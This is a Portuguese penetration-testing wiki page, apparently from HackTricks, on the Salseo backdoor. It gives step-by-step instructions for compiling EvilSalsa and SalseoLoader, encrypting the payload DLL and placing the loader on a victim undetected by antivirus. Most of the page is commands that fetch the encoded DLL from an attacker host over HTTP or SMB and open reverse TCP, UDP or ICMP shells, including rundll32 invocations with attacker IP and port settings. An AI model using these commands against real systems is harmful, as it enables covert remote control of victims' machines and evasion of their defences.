# Salseo

{{#include ../banners/hacktricks-training.md}}

## Compilando os binários

Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.

Compile esses projetos para a arquitetura da máquina Windows onde você vai usá-los (Se o Windows suportar x64, compile-os para essa arquitetura).

Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build" à esquerda** em **"Platform Target".**

(**Se você não encontrar essas opções, clique na **"Project Tab"** e depois em **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Em seguida, construa ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Preparar o Backdoor

Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, agora você tem tudo o que precisa para executar toda a coisa do Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**

**Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**

## **Executar o backdoor**

### **Obtendo um shell reverso TCP (baixando dll codificada através de HTTP)**

Lembre-se de iniciar um nc como o ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso UDP (baixando dll codificada através do SMB)**

Lembre-se de iniciar um nc como o ouvinte do shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso ICMP (dll codificada já dentro da vítima)**

**Desta vez você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desativar Respostas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Execute o cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro da vítima, vamos executar a coisa do salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando a função principal

Abra o projeto SalseoLoader usando o Visual Studio.

### Adicione antes da função principal: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instale DllExport para este projeto

#### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Pesquise pelo pacote DllExport (usando a aba Navegar) e pressione Instalar (e aceite o popup)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Na sua pasta do projeto, apareceram os arquivos: **DllExport.bat** e **DllExport_Configure.bat**

### **Des**instalar DllExport

Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Saia do Visual Studio e execute DllExport_configure**

Apenas **saia** do Visual Studio

Em seguida, vá para sua **pasta SalseoLoader** e **execute DllExport_Configure.bat**

Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace for DllExport**) e pressione **Aplicar**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Abra o projeto novamente com o Visual Studio**

**\[DllExport]** não deve mais estar marcado como erro

![](<../images/image (8) (1).png>)

### Compile a solução

Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)

![](<../images/image (10) (1).png>)

Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilar --> Alvo da plataforma = x64)

![](<../images/image (9) (1) (1).png>)

Para **compilar** a solução: Compilar --> Compilar Solução (Dentro do console de saída, o caminho da nova DLL aparecerá)

### Teste a Dll gerada

Copie e cole a Dll onde você deseja testá-la.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
Se nenhum erro aparecer, provavelmente você tem um DLL funcional!!

## Obter um shell usando o DLL

Não se esqueça de usar um **servidor** **HTTP** e configurar um **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
